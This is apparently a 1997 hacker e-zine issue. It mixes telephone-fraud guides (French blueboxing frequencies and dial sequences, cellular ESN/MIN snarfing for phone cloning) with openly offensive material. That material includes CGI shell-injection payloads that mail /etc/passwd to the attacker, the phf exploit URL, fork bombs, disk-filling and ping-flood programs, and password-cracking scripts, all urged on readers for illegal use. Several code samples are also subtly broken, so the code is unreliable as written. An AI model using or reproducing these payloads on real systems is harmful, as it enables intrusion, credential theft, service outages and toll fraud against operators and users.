					Editorial by Scud-O

	   First off, I want to apologize for the poor quality of issue 7.
I was worried that it would not be 100k, so I added some crap, and I know
that I shouldn't have. This is NOT what you have or should come to expect from 
HBS and The HAVOC Technical Journal in particular.
	   Anyway, next month KungFuFox is going to guest edit, and Keystroke and
disc0re will help him collect articles and distribute them. I am going to
be ram-rodding thtj down everyone's throat, and getting more and more people 
to read thtj.
	   This break will from editing will allow me to get back on track with 
school, and focus more so that I can write better articles. Issue 8 has gone 
fairly well, I am proud of it, and I think it is one of our greatest yet. 
However, only a few people contributed to it, so I have worked extra hard on 
my articles, especially the Denial Of Service article, which I feel is 
probably the best writing I've done so far. So read it and tell me what you 
think. This issue may even tie or beat issue 6 as our best issue ever.
	   I'll be getting the web page fixed up, adding the files page, 
getting linux installed on my computer again, getting the ISP ready, raising 
funds for the ISP, getting my ICMP project done, and getting HBScript aka mIRC 
HAVOC Bell Systems version 1.0 done. Hopefully somewhere in there I'll still
have time for a life and fun. geez... just saying it all makes me tired....

I  ---  French Phreaking & Blueboxing.

	1.1 *** French Phreakers Politics.

French phreaking scene is mostly using lame Calling Card (was using it 
because now with the Cartes Pastelles (pastels cards)) , calling card
made by France Telecom it is hardest to fraud (361010) and law are now
really bad with Carders.. Credit or Calling. Blueboxing dude are not
searched by cops and/or France Telecom so that make us having some little
skills in Blueboxing.

	1.11 Teletel Network In France.    

Well first Use of bluebox was to come on the Teletel Network (explained
in bif.txt) that 3615 network is really expensive and slow (1200bds-v23)
so we had (when we were young) to use bluebox for connecting it and 
staying on really long times (like how we are doing on irc now) , personnaly
i used that for connecting 3615 RTEL , a server which was talking about
computers, cracking and computers selling.

note: nua of RTEL is 020803506031801
			France____]\/[__________Server RTEL.
 city nammed rennes________|    

Rtel is still alive, it uses videotex terminals (you can get it on
ftp.minitel.fr or ftp.ibp.fr) , and you must have a modem which knows
v23 (for USR sportster v23 is ATS34=8 ATZ)

	   1.12 Warez Business & Phreaking.

The paradox team (France) was using calling card for accessing somes BBS in
usa and downloading Super Ninterdo Games, PC and Amiga Warez.. but their
calling cards died, so they fastly learnt bluebox for making their business
living again.. they were bluboxin to usa for dlding games and selling it in
France.. they all got busted.

	1.2 *** Type Of Phone Numbers In France.

	   1.21 Local & National Highly Dangerous # Numbers.

The local phone numbers, numbers that u must pay at the connection opening
(0.73FF ... 5$US=1FF) and after u have to pay a taxe/min like 0.23FF/min
so that phone are not really interesting for blueboxing because u still
pay something.. well maybe interesting for calling an another country
but for calling somewhere in france, thats not interesting at all, National
Phone numbers are same (0.73FF at connection opening) but after , you pay 
more.
Well.. you want to bluebox on that phone number, ok you are a good phreaker,
you scan and u pass all the filters of the french system.. you find 
frequencies like:

 Freq1 : voice1:2700 voice2:2650 lenght:130ms delay:10ms
 Freq2 : voice1:2570 voice2:2430 lenght:300ms delay:10ms

After , you redial in France for calling that hospital :

 Dial_Seq:A0380293031C
    local_]\/[___________________________Hospital Number of dijon
		 For calling Provence  

Now france is divided in parts like

	A01 <- Paris
	A02 <- Province (East of France)
	A03 <- South Of France / Province

Well you can call another country via or Routine Code

 Dial_Seq:A001(USA PHONE NUMBER)C
	  A00 is for calling a foreign country

 or via Dial_Seq:B01(USA PHONE NUMBER)C
		B for an international call.

 But well if a company or someone you bluebox on ask France Telecom 
 about a fraud, France telecom uses for his local/national phone numbers
 a big loging (1 month loging for each phone number) which is written
 
 Who Call <-> Who is Called <-> Lenght <-> Date     / Times
 11111111  -  222222222      -  3Hours  -  25/12/96 / 00:00
 22222222  -  B01xblahxC     -  2H59Mn  -  25/12/96 / 00:01  

 11111111 is you so u can be located.. be careful.. numbers really
 dangerous.
   
		1.22 0800 Dangerous Free # Numbers.

 0800 numbers are free phone numbers in france , same method for blueboxin
 on like France local/national phone numbers , but same danger.

		1.23 080090xxxx & 080091xxxx Free BlueBoxing # Numbers.


 That ones are more more interesting, because they are free phone numbers
 but for calling anothers countries.. like calling KornFlex(USA) from
 a 080090xxxx , with that ones, you can call... most of the countries like
 Perou, Chili, USA, Canada(0800908026), UK, DE ,...
 Well you can bluebox on it , but you must know the frequencies of the 
 countrie.
 like for coloumbia:

 Freq1:2600 Freq2:2550 lenght:150ms delay:10ms
 Freq1:2400 Freq2:2350 lenght:300ms delay:10ms

 dial in CCITT#5 ...
 coloumbia in not really interesting , because you can only phone in local
 coloumbia ... BxxxxC will sux... only AxxxxxC works if you dont try to
 use a routine code, it will hang up to busy if you try that.
 No logs on that numbers.

		1.24 1800 & Operators # Numbers.

 1800 numbers are free for calling foreign countries operators but i know
 it is not logged , so its "safe" to blueboxe on it, i know some person which
 do that (Dominicana Republic) from their home,We scanned Chili with 
 a friend at home, well the sure thing is that we are not busted and we did
 that 1 month ago. Dominicana Republic died 5-6 months ago.

	Now some numbers for Calling France Direct (A french operator)
for free from your countries:

					Fiber Optics by Keystroke

I explained the first main fiber optic project in my last article for HAVOC
(the TAT-8). Here, I will try to give you a brief overview of fiber optic
communications.

Fiber Optics Communications

Fiber Optics Communications or lightwave communications

A typical fiber optics communications system consists of three basic
components:

1. Optical Transmitter
2. Optical fiber
3. Optical Receiver
4. Havoc (Optional)

The transmission of information over a distance using optical fiber usually
requires several steps. First, the the info is converted into an electrical
signal (if it is not already in that form). Second, the electrical signal is
changed into an optical signal w/ the help of an optical source. Third, the
optical signal is transmitted through the optical fiber. Fourth, the optical
signal is detected and converted into an electrical signal with the help of
an optical detector. Finally, the signal processing is done.

Below are some more specific optical fibers, recivers, etc

Electrical Interface - Electrical Modulator, encoder, multiplexer, etc.
				   Optical transmitter - Led, laser diode optical fiber
- Monomode step index fiber, multimode step-index fiber,
				   multimode graded index fiber

Optical receiver - pin diode, apd, photo transistor, photo darlinton
			    electrical interface - electrical demodulator, decoder,
			    demultiplexer, etc.

Theoretically, an optical signal with a wavelength of 1 micrometer, a
bandwidth of 300 THz is possible. Presently, the maxium bandwidth is only
10 Gbps :p Monomode step index is best for long haul projects (less
transmission loss) while multimode is better for short haul (more loss, but
also more speed)

There are 3 types of optical fiber: Monomode step index fiber, multimode
step-index fiber, and multimode graded index fiber.

There are many benifits of fiber optic communication:

Large Bandwidth (explained above)

Small size and weight (tens of micrometers smaller than the diameter of a
human hair and MUCH smaller and lighter than copper (sic) cables)

Dielectric construction - No ground lops are required (no external
electromagnetic fields)

Low transmission loss - (monomode fibers loose .2 db/km multimode 1db/kb -
not many repeaters necessary)

EMI & RFI immunity - No cross talk because there is no generation of
electrical or electromagnetical noise or interfierence

Signal security - Optical fibers do not radiate energy. Can't be tapped in a
non-intrusive manner. (Military and banks use them)

High reliability and durability - cant corrode - cant oxidize - can be used
in explosive or nuclear enviroment

Now to compare optical sources

			LED       vs.       Laser Diode
Spectral width      Large 30-40 nm           Narrow 1 - 2 nm
Modulation bandwidth     1 Gbps                   6 -10 Gbps
Insertion loss      10 -15 db           3 db
Output power        1 -5 mW                  5 - 15 mW
Life expectancy          100 million hours             1 million hours
Temperature Sensiviaty   Tolerant                 Sensitive
Beam divergence          Large                    Narrow
Cost           Low                 High

Optical Detectors

		PIN (P-type Intrinsic, N-type)     APD
Sensitivity    Low                 High
Cost      Low                 High
Temp. Sensitiv.     Tolerant                 Sensitive
Bias Voltage   Low (10-50 V)            High (100-300 V)


As you can see, fiber optic communication is far superior to what is in use
today in the majority of the world (copper wire).

-------------------------------------

   Imagine........

	   evilempire.org is to be the future of HBS, our up and coming ISP.
We are currently filing for the domain with InterNIC, and plan for Defraz to
run a simple vdomain for us until we get minos ( the ISP computer) built.
evilempire.org will start up with at least 2gb of space or so, and we will
expand as we need to, and as funds allow. we plan for the computer to be
co-located ( basically this means at an ISP's building, with a t1 connection)
but with a modem and a line to for my internet access, and possibly psych0's
if he pays me. We will be offering accounts for a low fee, which will help us
cover the cost of start up ( hopefully about only 1000$) and the monthly cost
of start up ( about 300$ a month). As we get more and more users, accounts
will get cheaper, as we will only be usng the money to pay for the monthly
fees and the costs to upgrade hardware, etc.

	   When we start, we will have 1gb of space for users, since about 1gb
will be used for linux and misc software, FTP files, newsgroups, etc. However,
if we can piggy back off of the ISP that will run us, we may use their
newsgroups and then offer more space to users.

	   We currently need at least 30 users to make this happen, so i am
offering the following, The first 35 to 40 people that sign up, i will give
you slashed prices on accounts when i have more people using the service, and
will make your accounts free if i make enough to cover for your accounts.

	   And, as i gain users, i will start to offer different accounts if
people say, only want to run a bot or two on the account, i will lower the
price.

	   As of 3-3-97 Our pricing plan:
	   ----------------------------------------------------
	   $5/mo                   email + newsgroups
	   $10/mo                  full shell
	   $15/mo                  secured shell *

	   $5/mo                   bot account only

	   $10/yr                  for each 10mb after the quota limit
	   $15/yr                  FTP account **


	   * a secured account will offer more leanancy if you use the server
	   to run attacks on servers, etc. However, we WILL suspend your account
	   if you abuse IRC and i get e-mails that if you do not stop, they will
	   ban our domain. I AM NOT going to get evilempire.org banned from every
	   IRC server out there!!!

	   ** The FTP accounts will assure that you can get the files you need,
	   since we plan to have a LARGE file collection, but only about 5
	   anonymous FTP's at a time. All shell accounts come with this.

	   All shells come with: CGI-BIN, all UNIX stuff, many IRC progs,
	   tons of DOS attackers, FTP access, mailbombers, allowed to run bots,
	   and about 20-50+ mb of space!
	   -------------------------------------------------------------------

We plan to get the server up be June or July, so send in the money soon if you
want a premium account! E-mail me at: FoxMulder@worldnet.att.net for more
information, and since our PO Box is not up yet.

					Gettin the Digits by FuScAT

(*** ed note: although this article does not go as indepth as i had hoped, it
none the less give you a good over view of 'snarfing' ***)

 
Basically we are dealing with the concern of obtaining  Electronic Serial Numbers (ESNís) 
and Mobile Identification Numbers (MINís) for reprogramming cellular fones. Really 
there are about three basic ways to go about doing this that I am currently aware of. If you Know of any other please let me know about them.
 
 
First: 
Social Engineering 
	   You could call up your cell provider and ask for a service man to come
take a look at your fone. They will give you a name and say he will be there
shortly. Then about 10 minutes later call the provider back pretending to be
the service man they just sent out, and with the proper jargon and know how
you can squeeze the info out of them. Really not very affective and frankly
probably more of a waste of time...
 
Second: 
A CellScope 
	   Its a fairly simple few pieces of hardware and software consisting of
a cellfone, a palmtop pc(or laptop), the proper software, and an antenna.
Basically the cellfone is used to scan the channels and frequencies of the
cell sites, when a number in use is displayed on the screen from the software
you can lock in on it and the warez will snag the ESN & MIN for you leaving it
in plain english for you to use..VERY PRACTICAL but highly unaffordable.
(unfortunately cus Im sure we would ALL love to have one), and oh yea only
usable by law enforcement agencies or private detectives...(grin) 
 
Finally 
Modified Scanner 
	   There is a way to modify a handheld police scanner to do virtually the
same thing the CellScopeís cellfone does. You can make a few (quiet a few)
modifications to your scanner to make it scan the cellular frequencies. Now
you will also need the hardware for this, being the connector cable you will
need to connect your scanner to your pc or laptop. Then with the the right
software and the know how you will be able to snag ESNís & MINís 
 
If I am mistaken in any way PLEASE correct me...and if anyone knows of other
ways to get the digits please let us know...

	   CGI Insecurities Part III.........................Scud-O

----------------
NOTE:  HBS brings it to you first! We started on CGI weaknesses in October,
phrack brought CGI weaknesses in December! (sorry, just had to gloat a
little!)
----------------

	   Well, this is the final chapter in my three part series of CGI
Insecurities, and this will probably be the most useful parts of the whole
series, since you can use these holes in scripts that are out there running.

This part of the article covers many topics, but it also focuses mostly on
shell escapes. Many cgi ( especially perl scripts) use calls to unix commands
(mostly sendmail or mail) to get simple serivces done.

Shell escapes:
	   Many, many,many CGI scripts are vunerable, since they use mail, or
even sendmail <gasp> (what the hell is wrong with those CGI scripters? dont
they know that sendmail has holes?). Using for example ~ or other shell
escape codes, it is possible to get a shell on the remote systems to cause
heh, HAVOC!
	   Sendmail is also a BIG hole here, since sendmail holes can be cracked
and exploited by the CGI program.


system() :
	   Another big weakness is the gold old system call, which i presented in
issue 6 (however that was for c, but the basics are the same). If you find a
system(), or even an exec() call, you can modify the html document by, if
you use nutcrape (im not covering IE, since it is the devil!) by clicking,
view, then document source, then change the CGI to system("command_to_run") ,
(command_to_run of coursing being the comand you want to use) save the file,
relaod nutscrape, and use it. Depending on how the CGI is coded, you might
need to add the sites address here and there, but i will leave that to you.

<input> fun:
	   Another way to get the password file, is similar to  the file i did
way back in issue 4, but this is a hidden input tag ( normally used to store
information from page to page, much like 'cookies'  do) which sends you an
email with the passwords.

ex:
	   <input type="hidden" name="mail_to"
	   value="info@site.com; mail you@your-isp.com < /etc/passwd">

	   This then, sends you the password file.

phf:
-----------
	   This bug is pretty common knowledge now, but basically, you enter the
following:

	   http://site.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd

		   [The Modern Guide to Denial of Service Attacks]
				 History and Modern Uses by Scud-O


	   Denial of Service (DOS) Attacks are nothing new. Many old
versions of UNIX would crash with this little bit of code if an
administrator did not see all the processes running.


	   main()
	   {
			 while(1)
				    fork();
	   }

I remember crashing a few systems with this little prog, and a system will go
down fast if this is not seen by an admin. Basically this program spawns ( or
forks) another process of it self which then spawns more, and so on. This is a
total attack since  all of the chold processes are waiting for new processes
to be established, so even if you kill one process, another will take its
place.
	   However, most current versions of UNIX are immune to this attack since
users are limited to a maximum number of processes (except root). Most UNIX
versions have the max number of processed buitl into the kernel, but Solaris
for example lets the value ( MAXUPROC) be set at boot time, in etc/system
under set maxuproc=100 (or whatever the sysadmin has set it to be). However,
if you have several accounts on a system, or have some friends with accounts,
you all can take down the system by running the program.
	   Having too many processes is a great challenge for sysadmins to fix
without having to reboot the system, since:
	   a) You can not run ps to determine what process numbers to kill, and
	   b) if you are not logged in as super user, yuo cannot use su or login
		 because both of these functions require the creation of a process,
		 which, if you system is overloaded, is impossible.

	   However, most sysadmins do not want to shut down their system by just
flicking off the power, since virtually no systems are designed to undergo a
fast, orderly shutdown when quickly powered off. And sysadmins know that
hitting the power is not good for the disk, since it may lose disk blocks, and
it will not flush the buffers to disk, thus losing any unsaved work. So admins
are left to randomly killing processes, or if their system supports it, doing
a kill -TERM -1 , which sends a SIGTERM to all processes except superuser
processes and system processes.
________________
Disk Attacks:
	   Another old method of attack is the old disk attacks, such as filling
up the hard disk, or tree-structures, bot presented below.

	   Hidden Space:
			 This is a form of attack that will work very well as long as
the computer it is on is run 24 hours a day. Basically the sample bit of code
below creates and keeps a file open, thus making it invisible to du or find,
yet  still takeing up space. This is due to the fact that unlinked files are
not in the directory tree, yet they still take up space.

filename: fillup.c

	   #include <stdio.h>
	   #include <stdlib.h>

	   main()
	   {
			 int ifd;
			 chat buf[8192];
			 ifd= open("./attack", O_WRITE| O_CREAT, 0777);
			 unlink("/.attack");
			 while(1)
				    write(ifd,buf, sizeof9buf));
	   }

	   This little program, after creating the file, runs an infinite loop,
which continues to fill up disk space, and stops anything from being worked on
since the disk will be filled up. Try using a ls or du to see the file and it
will not be there, causing the sysadmin some confusion. That is unless they
have a copy of lsof on hand, or they kill the process or all processes. Now
to make this go faster, always run this in the background, and then run a few
more copies just for good measure.

* HINT: one way to get this to work faster, is to add a fork() call in the
program, thus making it run multiple copies, and filling up the drive faster.

-----------------
Tree-scructure attacks

	   These are actually quite lame and weak, but they can still cause some
problems, since a tree could be made that is too deep to be deleted by rm.
(HINT: for a very good attack, combine this and the attack up above, to make
a huge directory with huge files!)

a sample shell script that makes these directories and fills them up is below:

	   $!/bin/ksh
	   $
	   $ Dont try this at home, unless you are quite foolish!
	   while mkdir anotherdir
	   do
			 cd ./anotherdir
			 cp /bin/cc fillup
	   done

On many systems rm- r just cannot delete trees this big, since they can
overflow buffers or limits on the number of filenames or open directories
at one time. using chdir you can delete them manually, but this is quite
boring so most admins would just write a script to do this. (e-mail me if you
need the script)

------------
/tmp
	   On many UNIX systems out there today, both users and programs can
create files of unlimited size in the /tmp directory for temporary usage.
Now, you can simply about this vunerability by using the fillup.c or tree
structure progs above and fill up the /tmp dir and conscequentally fill up
the entire disk.

------------------
Network Attacks:
------------------
	   Okay, you are proably saying, hey great, i have these methods to
attack a local system i have an account on, but what about remote systems that
i may not have an account on? well, thanks to daemon9 and other coders out
there, there is an abundancy of remote DOS attacks.
	   We are also lucky, to date no firewall really protects from a DOS
attack, but watch that change soon. With all the hype and press about DOS
atacks on ISPs, firewalls will soon be able to  block DOS.

	   For daemon9's article on TCP/SYN flooding, either
		 a) goto http://www.geocities.com/SiliconValley/8805/files.html
		    and scroll down to 'phrack' and click on issue 48
		 b) goto http://freeside.com/phrack.html and scroll down
		    to past issues and get issue 48
		 c) or ftp.fc.net/pub/phrack/ and get phrack 48

	   You will want article 13 which is Project Neptune by daemon9.
	   daemon9 gives a great indepth analisys of TCP/SYN flooding and
	   offers a great C program to attack systems.

Now the basic info on TCP/SYN flooding presented here is nowhere near as
informative as daemon9's since i have not spend as much time on it as he has.
What is below is a very simple explaination of the basic if the flood.

	   First, we need to see a simple connection. TCP uses a 3 way hand shake
to start up a conversation. ex:

			 A                       B
			    ---------> SYN
			    <--------- SYN/ACK
			    ---------> ACK

	   Now if A is the client computer and B is the host, A sends a SYN to
B, and B replies with a SYN/ACK , This tells the client that the server
acknologizes the connection and then the client replies with an ACK, which
says that it acknologizes the connection as well, and the connection is made.

	   While a SYN is waiting to be processed, it sits in a backlog queue,
waiting for the host to see it. Here is where the flood comes in. Since UNIX
creates a backlog to prevent several SYNs filling up the memory ( which would
make our job so much faster), we must fill up the queue.

	   If you use a general IP Spoofer, (or the code in phrack 48) you can
use it to make your connection appear to be coming from the spoofed IP, which
MUST be unreachable so it cannot send a RST command. Basically, the client
sends a SYN to the host, the host tries to reply, but it sends it to the
spoofed IP, and since the IP will not respond, it will continue trying to
make a connection, until it times out. So if you run several SYNs to a hosts
port that you want to block, you can quickly fill up the queue, making the
port dead, since it can handle no more connections.

	   For code that does this, see phrack 48.

--------------------
SMTP floods:
--------------------

	   These are very simple to do, since STMP will pretty much accept just
about anything that comes their way. I did a simple mailbomber in issue 7, so
use that to mailbomb a server, try common accounts like postmaster@site
or info@site, etc, and send the system either several VERY large files to
fill up disk space, or many,many small mails to flood the STMP server with
e-mails, and thus making it unusable.

-----------------------------
ICMP_ECHO floods:
-----------------------------
	   These attacks are some of the most common, since they are often used
by IRC users to 'kill' other users, and thus many people i know are getting
k-lines and nasty messages from sysadmins who are pissed that someone from
undernet or another irc server has e-mailed them about you.

Anyway, below is some sample code that Keystroke had, and although he will
be pissed that i am adding it here, i am, so tough shit Key! (heh) This code
may also be the basis of my ICMP killer win95 program i will be developing
during the coming months, ( wish me luck on porting this from UNIX to Win95)

	   Basically tthe following code works, since UNIX systems will reply to
ICMP requests continually, not realizing that it may be halting the system by
replying to what the system thinks are simple ICMPs. Now adding an IP spoofer
to this setup, only makes things better since the computer will time out while
trying to get a reply from these ECHOs while new ECHOs are also hitting the
system, thus totally killing the system.

-----------------------
ping floods
-----------------------

Ping floods are very similar to ICMP_ECHO floods, in that they both send
thousands of replies that the host you are attacking will reply to, not
realizing that repling to the ping can be bogging down system resources.
Probably one of the bets ways to run these is with a IP spoofer, so the
computer takes more time trying to reply to a dead ip, and it also will
keep your sysadmin yelling at you in case the attacked host sysdamin
traces the connection.

from the command prompt you could use:

ping -s 4000 host &
 
* if you are running linux, then just use the -f command which sends out pings
as fast as possible, thus bogging the remote system.

Or you could code this simple C program:

/* pingkill.c - by Scud-O */
#include <stdio.h>
#include <stdlib.h>

void main()
{
	   while(1)
	   {
			 system (ping -s 4000 host);
		sleep(3);
	}
}

You can also use a for loop or a counter if you do not want this program to
run forever.

-----------------------------------
PLEASE NOTE: for any of these attacks it is advisable to run them in the
background, since these attacks can take some time, especially if the system
is quite large. ( if you dont know how to run stuff in the background, go
hang yourself ( actually just add a & at the end of a command, and if you want

					   [The 'g0d' Project]
				General Info, Techniques, Etc by Scud-O
				.......................................
				The 'g0d' Project is <c> HBS 1996,1997
					   !ALL RIGHTS RESERVED!
				.......................................

 I. Introduction
	   The first question you must be having about this little project is...
But Aren't you an athiest? Well, yes, but this project was named after god
because I find it quite humorous, and the fact that it is easy to come up with
good quotes for 'g0d' to say.

 II. What the hell is 'g0d'?
	   Well, to put it simply, 'g0d' is what will be developed into an AI Bot
for IRC. Why? Well, because it seems like I cool idea. I have heard of another
bot called 'mama' written by a Peter Sjostrom, and is on some irc servers
#amiga, but I can not confirm this.

 III. How the hell did you come up with this idea?
	   Well, one night when I was ENCREDIBLY bored on IRC, I changed my nick
to g0d and pretended to be the AI Bot. It was quite fun, and many fools
believed me. So after that night I started to think, hell maybe I COULD code a
simple AI bot and then keep extending its powers.

  IV. When is 'g0d' going online?
	   Well, currently I am debating whether to code g0d in C or HEAVILY
modify an eggdrop to my needs. I WAS going to add g0d to #phreak a while back,
but g0d was to run on tombin's server, and well he fucked up my account, so
to date ( 2/22/97 ) g0d in his eggdrop form is not online. But I predict that
I can get a VERY simple version of 'g0d' up by early June, or sooner, it all
depends on my work load and if I EVER get some sleep since lately I have been
becoming an insomiac and not been sleeping.

 V. How the hell do you expect this to work?
	   Well, really it is very simple. The will be 2 main parts to this bot,
The actual bot which communicates to the servers manages its connection,
writes and reads text, etc, And the actual AI part of the bot. The AI will
mainly consist of a string parser, which will tear up users words, and then
if they match any of the bots files, it will reply. g0d will hopefully also
watch over quit messages and identify netspilts, offer files, and of course
offer those ever so funny quotes when a user on the list joins the channel and
then op them.

 VI. g0d v0.11
	   g0d version 0.11 should be up soon. This version will have only VERY
limited AI, almost none really, and is to be based on |\|\cFill's bot example
in THTJ 5. So if you see g0d on #phreak say hello and see what he does. heh.

	   
				.......................................
 live in fear, g0d is coming to punish the sinners and reward the disciples!
				.......................................

Watch for this and other bots coming soon from HBS!

 Reload           - A very basic bot that basically just visits and revisits
				the same web page or pages over and over (helps with the
				web counters no?)

 Black Widow      - Site indexer or spider (similar to the ones that servers
				like Lycos and others) with a possible feature that
				'rates' web pages using a VERY basic parser like in 'g0d'

 Newman           - Just like the character from 'Seinfeld' this little bot
				will play havoc on users mail and possibly news ( random
				news cancels? random mail floods? what will happen next? )

RTFM : UNIX Basics 101

	   Last month I wanted to write my own beginner's guide to UNIX, but
with deadlines and failing grades, it was not to be. So instead I had to add
a lame old lod text. Anyway, here it is, MY very own guide to UNIX, and basic
UNIX crackin. Enjoy.

					[Basic UNIX Info And Cracks]
							by Scud-O

	   If you didnt know, UNIX was first created at AT&T Bell Labs in 1969
after the wake of the failed Multix project. Since those days, AT&T has
greatly improved it, The University of California at Berkley has made their
own version ( BSD), which is also quite popular, Sun makes a version, and of
course there is the ever popular linux for the PCs. During this time, UNIX
took over the Internet, and is the domiant OS in the world. Sounds like it
would be extremely useful to know for both hacking, and future jobs, doesnt
it? Well you are in luck... this file is here to help.

Basic UNIX Commands:
	   Many UNIX commands are fairly simple, ( while some are very complex,
you will probably not use them or encounter them much, since they are used to
manipulate files, etc.) and if you know DOS, many of the commands are similar.

First: A basic run down of commands:

	   start bourne shell                      sh
	   start c shell                           csh
	   start korn shell                        ksh
	   call up a unix system (modem)           cu
	   chat with a user                        talk
	   clear screen                            clear
	   run command at a specific time          at
	   run a series of commands                batch
	   compile c programs                      cc
	   compress file                           compress
	   uncompress file                         uncompress
	   copy a file                             cp
	   count words in a file                   wc

	   change current directory                cd
	   stop a process                          kill
	   date + time                             date
	   delete file                             rm
	   make directory                          mkdir
	   disk usage by dir                       du
	   dir list                                ls
	   remove a dir                            rmdir
	   print working directory                 pwd
	   display free or total space             df
	   display file                            cat,page,more
	   edit file                               vi, ed
	   email                                   mail, elm, pine
	   notify on email                         notify
	   encrypt file                            crypt
	   display/set environment                 env
	   exit                                    exit
	   find file                               find
	   change ownership                        chown
	   change file permissions                 chmod
	   move file                               mv
	   save a log of current session           script
	   login as another user                   su
	   remote host login                       rlogin, telnet
	   login system                            login
	   run commands after you logg off         nohup
	   run commands in background              add '&' after program
	   run commands a low priority             nice
	   send msg to all users                   wall
	   turn on/off talk                        mesg
	   system news                             news
	   show machines on network                ruptime
	   set password                            passwd
	   pause before command                    sleep
	   print                                   lp
	   show processes                          ps
	   link files                              ln
	   start remont shell on a system          rsh
	   check spelling                          spell
	   info on unix system                     uname
	   info on user                            who
	   info on user                            finger
	   write messages to user                  write
	   help                                    man

----------
	   These are just some of the few commands a UNIX systems provides. There
are of course the usual Internet commands also:

	   telnet                  remote system login
	   ftp                     file transfers
	   mail                    email
	   irc                     irc!
	   lynx                    world wide web
	   news                    newsgroups
			 etc...

The commands you will use the most:

	   copy file                       cp
	   create text file                cat, vi, ed
	   change current directory        cd
	   delete file                     rm
	   dir list                        ls (use ls -l for more info)
	   make dir                        mkdir
	   display a file                  cat,more,page
	   edit files                      vi, ed
	   show processes                  ps
	   help                            man

-----------------------------------
These commands will get you though about 90% of common day to day UNIX life.
I recommend that you (a) Buy a simple book on UNIX, and (b) Get an ISP with
shell accounts, or use the shell that your ISP offers. Don't try to hack a
shell just yet, pay for one until you are fairly well used to unix, and then
work on cracking accounts. evilempire.org will be offering shells when it
opens, L0pht offers them, and most ISPs will sell you to you.

[Basic Cracks]
	   If you look back at issue 7 there is an article called Joes. A Joe is
a user that uses his userid as his password. I have included the C code from
that article to make your life simple.


/**********************************************************************
* joetest.c
*
* a -SIMPLE- password cracker that cracks account with the same username and
* password. (a 'joe')
*
* NOTE: If your system has shadowed passwords, then this must be run as root!
*
* Written for The HAVOC Technical Journal issue 7 by Scud-O
* http://www.geocities.com/SiliconValley/8805/
***********************************************************************/
#include <stdio.h>
#include <pwd.h>

int main(int argc, char **argv)
{
	   struct passwd *pw;

	   while(pw=getpwent() )
	   {
			 char *crypt();
			 char *result;

			 result = crypt(pw->pw_name,pw->pw_passwd);

			 if(!strcmp(result,pw->pw_name,pw->pw_passwd))
			 {
				    printf(" %s is a joe\n", pw->pw_name);
			 }
	   }
	   exit(0);
}

	   I have included this file, since most systems have a c compiler.
Just use: cc joetest.c to compile, and the run it. On may small systems you
may turn up nothing, and on larger systems you should probably find a few,
but you never know!
	   I also have 2 perl scripts that do the same thing, but one has a few
added features. I gave you the C code, since not all systems have perl, due
to security holes.

#!/usr/local/bin/perl
# joetest for perl
while (($name, $passwd) = getpwent) {
	   print "$name is a joe\n" if (crypt($name,$passwd) eq $passwd);
}

This code is for perl 5 only, and it includes some more features:

#!/usr/local/bin/perl
# joetest for perl 5 ( super joetest )
while (($name, $passwd) = getpwent) {
	   print "$name is a joe\n" if (crypt($name,$passwd) eq $passwd);
	   print "$name has no password\n" if !$passwd;
	   print "$name is a JOE\n" if (crypt(uc($name),$passwd) eq $passwd);
	   print "$name is a Joe\n" if (crypt(ucfirst($name),$passwd) eq $passwd);
	   print "$name is a eoj\n" if (crypt(scalar reverse $name,$passwd) eq $passwd);
}

----------------------------------------------
Just so you know:
	   The passwords on a system are kept in the file /etc/passwd .
On some systems, the file is shadowed, so only the admin can see the passwords
Passwords are also encrypted using crypt, which is a fairly strong one way
encryptor.Here is what a passwd file may look like:

root:WnDFHddnKu28M:0:1:system PRIVILEGED account:/:/bin/csh
nobody:*Nologin:65534:65534:anonymous NFS user:/:
nobodyV:*Nologin:60001:60001:anonymous SystemV.4 NFS user:/:
daemon:*:1:1:system background account:/:
bin:*:3:4:system librarian account:/bin:
.
.
.
rest of the lines have been deleted to save space...
.
.
------------------------------------------------------

These programs should all give you a quick into to hacking, and provide some
fun until next month.

	There is still much to cover, but this issue is over due, and I need
to get it out, so just wait until next month when we will have more great info 
for you all.

------------------
For the end of this month, I know that you will want to try to do some REAL
hacking now that you know some UNIX, and not just play around on some shell
account you are paying for, so I have included this c program that with a
host name, a password file, and a dictionary, it will find POP ( post office
protocol -- the commonly used mail protocol) passwords, which many time,
thanks to users stupidity, are the same as the full account passwords.
	   Anyway, have fun, to compile it: cc pop3hack.c , should do very well
for you. Also, remember from here on out, you are actually doing something
illegal, so stop and think about this for a minute.... are you ready? are
you gunna hack? If you dont say 'hell yes' prepare to be smacked!

Lammah(s) of the Month:
		_Kinst_ : BITCH!

-------------------------------------------------------------------
This Month Question(s):  Why is Kung going to edit issue 9?

	   Because not only does he kick major arse monkeys, he agreed to do it.
But Kung isnt the only one on the new THTJ editorial staff. both Keystroke and
disc0re have prominent roles in next issues release. So send them some e-mails
tellin em to make the issue better than the rest so Scud-O doesnt come back!

keystroke@thepentagon.com | ender@multigames.com | don't mail disc0re

  Next Month's Question: For KungFuFox to decide....
